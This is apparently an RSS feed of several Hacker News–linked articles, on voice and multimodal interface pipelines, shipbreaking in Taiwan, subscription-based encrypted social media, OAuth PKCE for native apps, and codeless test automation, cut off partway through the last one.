mobile app, building your own hardware), you may want to handle everything yourself. Jovo Client libraries like “<a href="https://www.jovo.tech/marketplace/jovo-client-web">Jovo for Web</a>” help with some of these elements, like recording mechanisms, visual elements, silence detection, and audio conversions.</p><p>After the input is recorded, the request containing the audio is sent to the <em>Interpretation</em> step of the pipeline.</p><h3 id="interpretation">Interpretation</h3><p>The <em>Interpretation</em> step tries to make sense of the data gathered from the <em>Request</em>.<br></p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/ridr-interpretation.png"><img src="https://ghost.jovo.tech/content/images/2020/09/ridr-interpretation.png"></a></figure><p>In our voice example, the previously recorded audio is now	turned into structured meaning by going through multiple steps:</p><ul><li>An automated speech recognition (ASR) service turns the audio into text</li><li>The text is then turned into a structure with <em>intents</em> and <em>entities</em> by a natural language understanding (NLU) service</li><li>Additional steps could include speaker recognition, sentiment analysis, voice biometrics, and more</li></ul><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/interpretation-detail.png"><img src="https://ghost.jovo.tech/content/images/2020/09/interpretation-detail.png"></a></figure><p>The <em>Interpretation</em> takes an audio file as input, runs it through various services, and then outputs structured, machine-readable data. This is usually a result of a natural language understanding (NLU) service that is trained with multiple phrases:</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/nlu-intro.png"><img src="https://ghost.jovo.tech/content/images/2020/09/nlu-intro.png"></a></figure><p>The service then matches the text provided by the ASR to an intent and optionally a set of entities. In our case it would be the <em>OpenHours</em> intent with additional information (“tomorrow”) in the form of an entity.</p><p>This structured data is then passed to the actual logic of the conversational app in <em>Dialog &amp; Logic</em>.</p><h3 id="dialog-logic">Dialog &amp; Logic</h3><p>In the <em>Dialog &amp; Logic</em> step it is determined how and what should be responded to the user.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/ridr-dialog.png"><img src="https://ghost.jovo.tech/content/images/2020/09/ridr-dialog.png"></a></figure><p>This step involves a couple of important things such as:</p><ul><li>User Context: Is this a new or existing user? Is any additional data about them available, like preferred location?</li><li>Dialog Management: Where in the conversation are we right now? Is there any additional input we need to collect from the user?</li><li>Business Logic: Is there any specific information about the business that we need to collect?</li></ul><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/dialog-detail.png"><img src="https://ghost.jovo.tech/content/images/2020/09/dialog-detail.png"></a></figure><p>In the current example, we would collect data about opening hours, maybe specific to the user’s preferred location (if the system manages multiple locations).</p><p>All the necessary data is gathered and then handed off to the <em>Response</em>.</p><h3 id="response">Response</h3><p>In the final <em>Response</em> step, the data from the previous step is assembled into the appropriate output for the specific platform or device.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/ridr-response-1.png"><img src="https://ghost.jovo.tech/content/images/2020/09/ridr-response-1.png"></a></figure><p>This also usually involves:</p><ul><li>Collecting data from a content management system (CMS) with e.g. localization features</li><li>Sending the output to a text to speech (TTS) service that turns it into a synthesized voice</li></ul><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/response-detail.jpg"><img src="https://ghost.jovo.tech/content/images/2020/09/response-detail.jpg"></a></figure><p>The output is then played back to the user, either stopping the session (closing the microphone) or waiting for additional input (a new <em>Request</em>). Rinse and repeat.</p><p>This example of a voice-only interaction still seems like a manageable process to design and build. What if we add more modalities though? Let’s take a look.</p><h2 id="multimodal-experiences-beyond-voice">Multimodal Experiences Beyond Voice</h2><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/multimodal-request-response-1.png"><img src="https://ghost.jovo.tech/content/images/2020/09/multimodal-request-response-1.png"></a></figure><p>The previous example shows how RIDR works with a simple interaction that uses both speech input and output. Early voice applications for platforms like Amazon Alexa focused mainly on voice-only interactions, for example when people talk to a smart speaker without a display. (<em>Note: You could argue that the LED light ring—which indicates that Alexa is listening—already makes it a multimodal interaction.</em>)</p><p>As technology evolves, interactions between users and their devices are becoming increasingly complex. As I highlight in <a href="https://www.context-first.com/introducing-context-first/">Introducing Context-First</a>, products are becoming multimodal by default. This means that we’re seeing more interactions that either offer multiple input modalities (e.g. speech, touch, gestures) or output channels (e.g. speech, visual). <a href="https://www.context-first.com/alexa-please-send-this-to-my-screen/">Alexa, Please Send This To My Screen</a> covers how multimodal interactions can either be continuous, complementary, or consistent experiences.</p><p>Let’s take a look at some multimodal experiences and how they could work with RIDR.</p><h3 id="examples-of-multimodal-interactions">Examples of Multimodal Interactions<br></h3><p>A multimodal experience could be as little as displaying additional (helpful) information on a nearby screen:</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/visual-output.png"><img src="https://ghost.jovo.tech/content/images/2020/09/visual-output.png"></a></figure><p>Or, the visual display could offer touch input for faster interactions, for example in the form of a button (they are sometimes called <em>quick replies</em>):</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/quick-replies.png"><img src="https://ghost.jovo.tech/content/images/2020/09/quick-replies.png"></a></figure><p>It gets increasingly interesting, and challenging to implement, when two input modalities are used in tandem:</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/gestures-voice.png"><img src="https://ghost.jovo.tech/content/images/2020/09/gestures-voice.png"></a></figure><p>The above is similar to <a href="https://www.youtube.com/watch?v=RyBEUyEtxQo">Put That There</a> which I mentioned in my previous post <a href="https://www.context-first.com/introducing-context-first/">Introducing Context-First</a>: Someone says something and provides additional context by pointing at an object. Interactions like this are challenging to decode and interpret. The process of making sense of multiple modalities is called <em>multimodal fusion</em>.</p><h3 id="multimodal-interactions-and-ridr">Multimodal Interactions and RIDR<br></h3><p>Let’s take a look at how RIDR can be abstracted even more to work with multimodal interactions. The goal is that each of the building blocks can easily be replaced depending on the current context of the interaction.</p><p>For example, the <em>Request </em>step does not necessarily need to contain just a microphone, it could also have a camera or sensors to collect user input. We could call each of these elements a <em>modality recorder</em>.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/request-multimodal.png"><img src="https://ghost.jovo.tech/content/images/2020/09/request-multimodal.png"></a></figure><p>In the <em>Interpretation</em> step, it could also be divided into two distinct steps. A <em>recognizer</em> that turns raw input (like audio, video, even emoji or a location) into a format that’s easier to process for an <em>interpreter</em>.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/interpretation-multimodal.png"><img src="https://ghost.jovo.tech/content/images/2020/09/interpretation-multimodal.png"></a></figure><p>Not every interaction would need to go through each of the steps. Different input modalities might require different treatment:</p><ul><li>Text-based interactions (e.g. chatbots) can skip the speech recognition</li><li>Touch-based interactions need to take into account the payload of e.g. a button (where was it clicked?)</li><li>Vision-based interactions (e.g. gestures) need different steps that involve computer vision and interpretation</li></ul><p>As mentioned earlier, this can get even more complex as you add multiple modalities at once. For this, an additional step for <em>multimodal fusion</em> is introduced.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/multimodal-fusion.png"><img src="https://ghost.jovo.tech/content/images/2020/09/multimodal-fusion.png"></a></figure><p>The <em>Dialog &amp; Logic</em> step from the voice example above can stay the same for now. We’ll take a deeper look at this in the next post as there are many additional layers to dive into.</p><p>The <em>Response</em> step is another interesting one. Where voice requires a text-to-speech (TTS) service, a multimodal experience might need additional elements like visual output or a video avatar. We call services fulfilling this step <em>output renderers</em>.</p><figure><a href="#" data-featherlight="https://ghost.jovo.tech/content/images/2020/09/response-multimodal.png"><img src="https://ghost.jovo.tech/content/images/2020/09/response-multimodal.png"></a></figure><p>That’s how we currently envision multimodal user interfaces to work under the hood. This model will be updated and improved as we iteratively learn and experiment with the addition of new modalities. </p><h2 id="open-questions-and-outlook">Open Questions and Outlook<br></h2><p>This post provided a first introduction to the many steps involved when building a seemingly simple voice interaction, and how this can be applied to multimodal experiences.</p><p>Again, this is a work in progress. Here are some additional questions I currently have:</p><ul><li>Right now, this only covers user-initiated (pull) request-response interactions. What if the system starts (push)? Could sensory data be used as a trigger?</li><li>Should interpretation and dialog/logic be tied together more closely? How about dialog/logic and response? <a href="https://blog.rasa.com/demonstration-of-our-ted-policy/">Rasa’s TED policy</a> is one example where the interpretation step is doing some dialog and response work.</li><li>Are there use cases where this abstraction doesn’t work at all? Do (currently still experimental) new models like <a href="https://openai.com/blog/openai-api/">GPT-3</a> work with this?</li></ul><p>While this was already getting a bit complex at the second half of the article, it was still a simple example. It …</p></section></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.context-first.com/introduction-voice-multimodal-interactions/">https://www.context-first.com/introduction-voice-multimodal-interactions/</a></em></p>]]>
            </description>
            <link>https://www.context-first.com/introduction-voice-multimodal-interactions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542826</guid>
            <pubDate>Mon, 21 Sep 2020 13:04:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Rid of Old Ships]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542764">thread link</a>) | @mef
<br/>
September 21, 2020 | https://www.pacmar.com/story/2018/03/01/features/getting-rid-of-old-ships-the-world-of-shipbreaking/593.html | <a href="https://web.archive.org/web/*/https://www.pacmar.com/story/2018/03/01/features/getting-rid-of-old-ships-the-world-of-shipbreaking/593.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The shipbreaking industry has been around as long as there have been ships but over the past half-century it has gravitated to regions offering both inexpensive land and cheap labor. Prior to World War II, yards in Europe, the US and Japan handled most shipbreaking, with the well known Ward yard in the United Kingdom gaining public attention by breaking up some of Britain's best known ocean liners and naval vessels.</p><p>After the end of the war, and with many worn-out ships to dispose of, Taiwan became a major destination for vessels approaching the end of their economic lifespans. This saw the Port of Kaohsiung, in southern Taiwan, become a major base for the industry where vessels could be brought alongside makeshift berths and cut down using semi-skilled labor and oxy/acetylene torches. However, once the land supporting these waterfront businesses became too valuable for demolition in the 1980s the mudflats of Pakistan, India and Bangladesh rose to prominence by offering even cheaper labor as well as lax environmental regulations and low taxes.</p><p>In Europe, what remained of the shipbreaking industry gravitated from the north to less expensive locations in Spain and Turkey, with the latter nation still continuing to compete with Asian breakers for smaller ships. In the United States most shipbreaking has been consolidated along the 17-mile shipping channel leading to the Port of Brownsville,Texas, near Mexico, where much of the resulting scrap is processed, while a small yard at Port Colborne, Ontario handles some Canadian and Great Lakes ships.</p><p><strong>Kaohsiung – Once the Shipbreaking Leader</strong></p><p>The process of breaking up a ship is both dangerous and labor-intensive. In 1979 this writer was sent to Kaohsiung, Taiwan to report on the demolition of P&amp;O Line's <strong><i>Arcadia</i></strong>, which had helped pioneer the Alaska cruise industry in the early 1970s.</p><p>At the time Kaohsiung was the largest ship breaking center in the world, with Hong Kong's Junk Bay a close second and South Korea closing rapidly. <strong><i>Arcadia</i></strong>, built by Great Britain's famous John Brown yard at Clydebank in 1953, had been purchased by a Japanese broker in 1978 and resold to a Kaohsiung-based company for demolition. By that time the steam turbine propelled ship, built for the Australian immigrant trade, had steamed more than 2.5 million miles and was ready for retirement.</p><p>Through the auspices of the Regional Association of Old Ship Demolition Engineering Industry, a ponderously titled organization that served as an umbrella agency for the shipbreakers of Kaohsiung, I was introduced to Mr. Wang Fu Yin of Keun Hwa Steel who would be my guide though the yards. As an English-speaking staff member of one of the region's larger steel works he was in a good position to answer most of my questions concerning the industry.</p><p><strong>Dah Jen and Dah Lin Pu</strong></p><p>In the 1970s ship demolition was done at two major facilities located within the southern reaches of Kaohsiung <a href="https://www.pacmar.com/search/Harbor">Harbor</a>, Dah Jen and Dah Lin Pu, where vessels were brought alongside rather than "beached" as is done today in India, Pakistan and Bangladesh. This offered a much quicker demolition cycle than beaching as cut sections of ships could be loaded directly onto trucks for transport to regional mills rather than slowly pulled across mudflats for additional cutting.</p><p>Our first destination was the enormous Dah Jen complex located only a few miles from the city's airport. On our way through Kaohsiung our car was constantly passed by overburdened trucks transporting huge chunks of metal to the surrounding mills. Once in the yard itself we found ourselves surrounded by what appeared to be an endless wall of obsolete vessels; smoke, dust and powdered rust permeating the air. Around us winches were pulling cables taunt as heavy sections of metal were torn loose from hulls while fans of sparks cascaded down from hulls where workers were cutting ships apart from the inside out.</p><p><strong>Shipbreaking 101</strong></p><p>In answer to several of my questions, Mr. Wang explained how Kaohsiung's breaking industry worked. Ships were acquired on the world market through either independent brokers or the China Dismantled Vessel Trading Corporation, a purchasing cooperative formed by the breakers themselves. As is the practice today, the price was largely determined by a vessel's Light Displacement Tonnage (LDT). This is the weight of a complete but unloaded, un-fueled and un-provisioned ship. As an example, the world's largest ship of that era, the stretched petroleum tanker <strong><i>Seawise Giant</i></strong>, had a loaded displacement of 647,955 tons but a light displacement of only 83,192 tons.</p><p>Mr. Wang noted that the actual price paid per vessel varied according to market conditions, the type of ship, its construction, the quality of its steel and what additional material or equipment it might still be found aboard. This included fuel oil as well as spare propellers and shafts.</p><p>Higher prices would normally be paid for vessels having large amounts of flat steel plate, such as tankers and bulk carriers, while lower prices might be offered for passenger liners and refrigerator ships, both having complicated interiors and large amounts of wood and insulation to deal with.</p><p>During our tour of Dah Jen it could be seen that there was very little sympathy shown to ships in the actual breaking process. Great liners were torn apart, plundered, and melted down just as rapidly as the rustiest of old general cargo ships. Mr. Wang noted that each breaker maintained his own berthing area, which was sub-leased from the Kaohsiung <a href="https://www.pacmar.com/search/Harbor">Harbor</a> Authority.</p><p>The docks were staggered in such a manner that they allowed about a third of a ship alongside, the other two-thirds jutting out into the water. This permitted the greatest number of ships to be broken up in the most compact area.</p><p>Demolition would usually commence several days, and sometimes several weeks, after a vessel had arrived off port. Paper work would have to be cleared, import duties tabulated, business licenses obtained and various <a href="https://www.pacmar.com/search/Harbor">Harbor</a> fees paid. When everything was in order a vessel would be allowed to come alongside and its crew released for the long flight home.</p><p><strong>Subcontractors</strong></p><p>Once a ship was berthed the first of a number of subcontractors would scramble on board. Kaohsiung breakers at the time used various local contractors to "clean the ship," with each group having its own specialty. The first group would normally remove loose items – furnishings, tables, chairs, mattresses, lamps, cutlery, even the galley sink – all of it going over the side and into waiting trucks for delivery to second-hand shops. Next on board would be the wood removers. This group would attack the cabins, holds and decks, stripping timbers, planks, shelving and veneers, anything considered flammable, the wood itself being bundled up for sale ashore.</p><p>Once flammables were removed the cutters would come aboard. They were considered the craftsmen of the industry and their speed largely determined the profit to be made on each vessel.</p><p>At Kaohsiung the stern of a ship would usually be dismantled first, with large sections of the hull cut and lowered onto waiting trucks. The shoreside machinery used in this process – old derricks, winches and rigging – had been removed from ships long ago melted down.</p><p>Cutting would continue down to the engine room where pumps, generators and compressors would be removed for resale while the main engine would be demolished. The propeller shaft would then be removed and the bronze propeller lifted clear, its blades to be cut off by drilling. Work would then continue forward, the ship rising slowly upwards with each ton of metal removed.</p><p>Rigging and masts would come down and deck winches cut loose, all to be lowered overboard. In six weeks the average freighter or tanker could be reduced to its double-bottom, which would be towed to a separate beach and pulled ashore for final rendering.</p><p><strong><i>Arcadia</i></strong></p><p>To visit <strong><i>Arcadia</i></strong> we drove around the lower end of Kaohsiung <a href="https://www.pacmar.com/search/Harbor">Harbor</a> to the Dah Lin Pu facility where the white-hulled ship had been positioned alongside the large tanker <strong><i>Andros Apollon</i></strong>. The scene was bleak as the 100,000-dwt crude carrier, less than a decade old, was already being cut apart while <strong><i>Arcadia</i></strong> had been intentionally listed over so her remaining fuel could be pumped off, the oil going into her once pristine lifeboats for transport ashore.</p><p>At the top of the pilot ladder a guard listened patiently to Mr. Wang's excuse for our coming aboard, then waved us on into the ship's dark interior. There was neither electricity nor lights. The only sound came from a motorized pump that was working on the liner's fuel supply far below. With flashlights in hand we proceeded forward along a dark corridor until we came to the main staircase. Here, workers were moving mattresses in bundles up to the outside decks.</p><p>As we passed one cabin, its door ajar, I looked in to see the bedding gone but two glasses still standing in their holders at the sink while two white shaving towels still hung on their hooks below. Orange life vests were still visible overflowing from the closets. Nothing had been disturbed.</p><p>Moving upward, we entered a lounge where we encountered more workers cutting and rolling up sections of carpet, the furniture having already gone over the side into waiting trucks. On the outside promenade we found yet another crew busily chiseling up the wooden decks, the tropical hardwood going into large bundles.</p><p><strong>Nautical Antiques</strong></p><p>In a small room forward we came across Mr. Ming H. Wu of Rainbow Enterprises who was busy sorting through light fixtures taken from<strong> <i>Arcadia's</i></strong> various public rooms. Mr. Ming was a local antiques dealer and had purchased most of <strong><i>Arcadia's</i></strong> decorative furnishing and brass items. Beyond him were stacked many of the ship's red and white life preservers as well as brass staircase railings, bed lamps and wooden deck chairs. He explained that all of the items would be shipped overseas, largely to antique dealers in United States, Europe and Japan.</p><p>Continuing to move forward and upward we …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pacmar.com/story/2018/03/01/features/getting-rid-of-old-ships-the-world-of-shipbreaking/593.html">https://www.pacmar.com/story/2018/03/01/features/getting-rid-of-old-ships-the-world-of-shipbreaking/593.html</a></em></p>]]>
            </description>
            <link>https://www.pacmar.com/story/2018/03/01/features/getting-rid-of-old-ships-the-world-of-shipbreaking/593.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542764</guid>
            <pubDate>Mon, 21 Sep 2020 12:57:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to solve the social dilemma and fix social media]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542754">thread link</a>) | @ianopolous
<br/>
September 21, 2020 | https://peergos.org/posts/the-social-dilemma | <a href="https://web.archive.org/web/*/https://peergos.org/posts/the-social-dilemma">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <center>
<a href="https://www.ngi.eu/">
<img alt="The Social Dilemma" id="id" src="https://peergos.org/theme/img/blog/the-social-dilemma.png" width="50%">
</a>
<br>
Still from the Netflix documentary, The Social Dilemma
</center>
<p>Netflix recently aired a new documentary, <a href="https://www.humanetech.com/the-social-dilemma">"The Social Dilemma"</a>, which explores in detail the harmful effects that social networks such as Facebook and Instagram have on individuals and society at large. One of the interviewees in the documentary, Jeff Seibert, has written a more <a href="https://medium.com/@jeff_seibert/the-mechanics-and-psychology-behind-the-social-dilemma-719d618aa8ce">detailed piece</a> on the underlying causes, methods and impacts of current social networks on society and democracy. He argues that advertising-driven business models combined with user-generated content and machine learning lead to increased polarization and anxiety, widespread misinformation, and mass-scale manipulation of society. Some proposals to fight this include regulation, like the General Data Protection Regulation (GDPR), which place strong controls on collecting data on users, even potentially banning personalized advertising.</p>
<p>We agree with Seibert, and we also have a solution. Regulation has the danger of increasing the power of the dominant incumbents, if it's not done correctly. They treat it as a burden and moat preventing competition, and competition is what is needed most. What new competitors need is a different business model. A business based on selling ads is not aligned with the interests of its user base. <strong>What if, instead of advertisers being the customer, the actual end-users were the customer?</strong> If users paid a small amount on a subscription basis, then the business would be incentivized to keep customers happy. This model may not maximize revenue for the company, but so long as the company is sustainable and able to grow, then that shouldn't matter. The apparent obsession with maximising revenue and growth at all costs is not healthy, and models in which users pay directly for services are better in the long term - for individuals and for society.</p>
<p>Whatsapp was a great example of a succesful subscription-based business. They started off charging a subscription of $1 per year. At the time of their acquisition, in 2014, Whatsapp had 450 million monthly active users, and annualized revenue of around $32M [<a href="https://techcrunch.com/2014/10/28/whatsapp-revenue">source</a>], and were adding a million new users every day [<a href="https://investor.fb.com/investor-news/press-release-details/2014/Facebook-to-Acquire-WhatsApp/default.aspx">source</a>]. For a company that had only 55 employees and operating cost around $10M, that sounds sustainable. Whatsapp also weren't really pushing for monetization, but rather growth. For example, they were relaxed about enforcing the $1 fee after the first year, and didn't apply it at all in certain countries. For comparison, at the time Facebook was making $7 in revenue per user.</p>
<p>Even a good business model can change depending on who owns the company. If investors or shareholders demand that profit is maximized, then that's what you have to do. To prevent this you either need to have benevolent investors, who aren't focused on maximising revenue at all costs, or don't have any investors. This could mean being entirely self-owned, or being a non-profit organisation. This alone probably isn't enough though - what's needed are built-in defences keeping any potential future owners honest and aligned with the users.</p>
<p>One of these defences to keep the company's interests aligned with the users is to reduce the barrier to leaving. If the social network is <a href="https://en.wikipedia.org/wiki/Decentralization">decentralized</a> then this is structurally enforced. In that case, if the company starts to misbehave in some way, users can easily move to another company (or self host) and keep all their data and friends. This is not possible with centralized social networks without open protocols. An open protocol actually takes this even further, as the user interface itself can be replaced. If the company were to start adding malicious features to the interface, people can simply switch to a different one. Combining this with being open source means it is also easy to modify the existing user interface. Social media incentives have never been this aligned with the users before. </p>
<p>There is still one major ace card to be played to protect users: end-to-end encryption. If the service cannot read your data, then it is impossible to target ads, even if they wanted to. This means that any social feed cannot be an arbitrary black box machine learning algorithm - it has to be assembled client side, thus putting end users in full control of their data and returning their autonomy. </p>
<p>The final component is ethical humane design. That means designing for the good of the human user. No manipulative notifications or dark UI patterns designed to increase engagement and steal more of the user's life. Social media should be a tool that is used to enhance people's lives, not something that manipulates people into spending more time on it. </p>
<p><em>"If something is a tool, it genuinely is just sitting there waiting, patiently. If something is not a tool, it's demanding things from you. It's seducing you. It's manipulating you. It wants things from you. And we've moved away from having a tools based technology environment, to an addiction and manipulation based technology environment. That's what's changed. Social media isn't a tool that's just waiting to be used. It has its own goals, and its own means of pursuing them by using your psychology against you."</em> <br>
</p><p>-Tristan Harris in The Social Dilemma</p>
<p>Putting all of the above together, what is needed is an open, decentralized, end-to-end encrypted and ethical social network whose business model is subscription based.</p>
<p>That's exactly what we're building.</p>

<h4>RECENT POSTS</h4>
    </div></div>]]>
            </description>
            <link>https://peergos.org/posts/the-social-dilemma</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542754</guid>
            <pubDate>Mon, 21 Sep 2020 12:56:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure Way of Doing OAuth for SPA and Native Apps]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542731">thread link</a>) | @aspleenic
<br/>
September 21, 2020 | https://blog.joshsoftware.com/2020/05/18/secure-way-of-doing-oauth-for-spa-native-apps/ | <a href="https://web.archive.org/web/*/https://blog.joshsoftware.com/2020/05/18/secure-way-of-doing-oauth-for-spa-native-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5884">
	
	
	<div>
		
<p>When clients like mobile, desktop, single page applications allow the user to sign-in using a third party application (google, facebook, twitter etc), one of the first choice is to use OAuth 2.0 standard with authorization code flow.</p>



<p>In Authorization code flow, authorization request is made via <strong><em>browser</em></strong> and an authorization code is returned to the redirect URL registered by the client. This authorization code is used by public clients to request for an access token to get access to resources.</p>



<figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/qfiblk0b346te5777e35.png" alt="Intercept Attack"></figure>



<p>Protecting this authorization code is thus critical but in most cases the public clients make use of custom URL scheme to capture redirects (e.g myapp://callback) thus having the risk of malicious applications to receive the authorization code.</p>



<p>Malicious apps can register the same custom URL scheme (myapp://callback) and mobile OS does not stop them to do so. As <code>authorization_code</code> is always sent back to redirect URL (in this case myapp://callback), the OS on reception of a redirect to custom URL scheme launches apps matching the scheme randomly. So the code may be sent to your app or may be the hacker app. You cannot prevent this.</p>



<h5>Authorization code flow request</h5>


<pre title="">https://authorization-server.com/auth
?response_type=code
&amp;client_id=example-client-id
&amp;redirect_uri=myapp://callback
&amp;scope=openid
&amp;state=example-state
</pre>



<h5>Authorization code flow response</h5>


<pre title="">myapp://callback
?code=hu831dsdsf23121
&amp;state=example-state
</pre>



<h5>Authorization token request</h5>


<pre title="">https://authorization-server.com/token?
grant_type=authorization_code
&amp;code=hu831dsdsf23121
&amp;redirect_uri=myapp://callback
&amp;client_id=xxxxxxxxxx
&amp;client_secret=xxxxxxxxxx
</pre>



<p>Well, even if they get access to the authorisation code, there is no risk as such because the attacker will not be having the client credentials (client_id, client_secret) to request for an access token. What if they have it too ?</p>



<p>In case of mobile applications, credentials are mostly hardcoded into the app and decompiling it will reveal those. Thus, for public clients it is not recommended to use client secret as it may be compromised.</p>



<p>To mitigate the risk, OAuth 2.0 provides a version of the Authorization code flow which makes use of a Proof Key for Code Exchange (PKCE, pronounced pixie).</p>



<h2>When to use PKCE ?</h2>



<p>You have a native client, such as an app on a mobile device, or a desktop app and it does not have a secure way to store client credentials for authenticating at the token endpoint.</p>



<h2>How it works ?</h2>



<figure><img src="https://dev-to-uploads.s3.amazonaws.com/i/jfpzv8yvkh2s1yeern9h.png" alt="PKCE Flow"></figure>



<p>When the public clients makes the authorization request</p>



<ul><li>They first need to create a secret known as <code>code_verifier</code>. This is a cryptographically random string between 43 – 128 characters.</li></ul>


<pre title="">function base64URLEncode(str) {
    return str.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

var code_verifier = base64URLEncode(crypto.randomBytes(32));
</pre>



<ul><li>Then use the <code>code_verifier</code> to generate a <code>code_challenge</code>. For clients that can perform a SHA256 hash, the <code>code_challenge</code> is base64 URL encoded string of the SHA256 hash of <code>code_verifier</code>, otherwise plain <code>code_verifier</code> can be used as a challenge.</li></ul>


<pre title="">function sha256(buffer) {
    return crypto.createHash('sha256').update(buffer).digest();
}
var code_challenge = base64URLEncode(sha256(verifier));
</pre>



<ul><li>Then it includes the <code>code_challenge</code> and a parameter to indicate method used to generate the <code>code_challenge</code> (plain or S256).</li></ul>


<pre title="">https://authorization-server.com/auth
?response_type=code
&amp;client_id=example-client-id
&amp;redirect_uri=myapp://callback
&amp;scope=openid
&amp;state=example-state
&amp;code_challenge=XXXXXXXXX
&amp;code_challenge_method=S256
</pre>



<ul><li>The authorization server then remembers the <code>code_challenge</code>, <code>code_challenge_method</code> against the authorization code it generates and then redirects the user back to the application with an authorization code.</li><li><p>When exchanging the authorization code for a token, client app need not send the <code>client_secret</code> in request, instead it sends the <code>code_verifier</code> generated before making the initial authorization request. This way even if an attacker gets the authorization code they will not have access to <code>code_verifier</code>, hence authorization code is of no use for malicious apps.</p></li></ul>


<pre title="">https://authorization-server.com/token?
grant_type=authorization_code
&amp;code=hu831dsdsf23121
&amp;redirect_uri=myapp://callback
&amp;client_id=xxxxxxxxxx
&amp;code_verifier=xxxxxxxxxx
</pre>



<ul><li>Authorization server verifies the <code>code_verifier</code> parameter in request by generating the <code>code_challenge</code> as per the <code>code_challenge_method</code> stored against the authorization code. If the verification is successful, server responds with an ID and Access token.</li></ul>



<h2>Summary</h2>



<ul><li>Do not store client credentials in native and single page applications.</li><li>Use PKCE security extension of OAuth 2.0 to securely exchange an authorization code with access token.</li></ul>



<h2>References</h2>



<ul><li><a href="https://tools.ietf.org/html/rfc7636" rel="nofollow">https://tools.ietf.org/html/rfc7636</a></li></ul>



<p>If you have any questions, feel free to comment, I’d love to hear your feedback! Thanks for reading!</p>
	</div>
		<!-- .entry-footer -->
	</article></div>]]>
            </description>
            <link>https://blog.joshsoftware.com/2020/05/18/secure-way-of-doing-oauth-for-spa-native-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24542731</guid>
            <pubDate>Mon, 21 Sep 2020 12:53:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern Codeless Test Automation: Myths and Facts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24542659">thread link</a>) | @AnuGeorge
<br/>
September 21, 2020 | https://testsigma.com/blog/modern-codeless-test-automation-myths-facts/ | <a href="https://web.archive.org/web/*/https://testsigma.com/blog/modern-codeless-test-automation-myths-facts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>With the advancement in technology together with the advent of Agile and DevOps, the software industry is witnessing many changes. Testing, being the part of the software arena, is also advancing to great new heights.</p>



<p>From manual testing to record-and-playback tools, then to automation testing and now to codeless test automation, we have traversed a long path.</p>



<p>And as we know only change is constant, there will be further advancements to make this journey more fun and fruitful.</p>



<h2>What is <a href="https://testsigma.com/codeless-testing" target="_blank" rel="noreferrer noopener" aria-label="codeless test automation (opens in a new tab)">codeless test automation</a>?</h2>



<p>Generally, when talking about automation testing, we are talking about automation testing by coding or scripting. The test cases are coded by writing scripts in any programming language like Java, Python, Ruby etc.</p>



<p>The testing scripts are integrated with frameworks like TestNG, Cucumber, Selenium Webdriver etc. to make the scripts more advanced and high-quality.</p>



<p>When we are talking about codeless test automation, we mean that the task of writing the code manually by the testers is waived-off. The codeless test automation tool will create the script without the involvement of code and the tester is not required to learn any code for the purpose of automation of test cases.</p>



<p>There could be multiple ways the automation tool can cater to this feature. Either the tool may read the user’s navigation and clicks, and finally, create a script for those actions. Another way could be that the tester writes the test case in natural language and based on the elements mentioned the tool creates the script. </p>



<p>Codeless test automation does not mean that there is NO script. If automation is there then definitely scripting will be a part of it, only that this script will be automatically created from codeless automated steps written by the Tester.&nbsp;</p>



<p>This codeless automation will reduce the upfront time required to write the test scripts and setting up of the framework. Also, it becomes easier for the tester to use such codeless test automation tools. Even a manual tester with limited knowledge of scripting can start using the codeless automation testing tools.</p>



<h2>Codeless test automation tools</h2>



<p>There are many codeless test automation tools available today in the market. Below are a few examples of codeless automation testing tools-</p>



<p><strong>1. Testsigma: </strong>A cloud-based test automation platform. Here, test cases can be automated using simple English. The execution and reporting are handled on the cloud.</p>



<p>Experience hassle-free end-to-end test automation with Testsigma, Book a demo today.</p>



<p><strong>2. Test Complete:</strong> A tool that uses keyword-driven testing to enable scriptless test automation. Here, each action is associated with a keyword which can be added in a script by the user.</p>



<p><strong>3. Ghost inspector:</strong> A tool that records user actions on the UI and compares screenshots too, to enable scriptless test automation.</p>



<p><strong>4. Ranorex: </strong>Ranorex allows record and playback for simpler scenarios and coding for the complicated ones.</p>



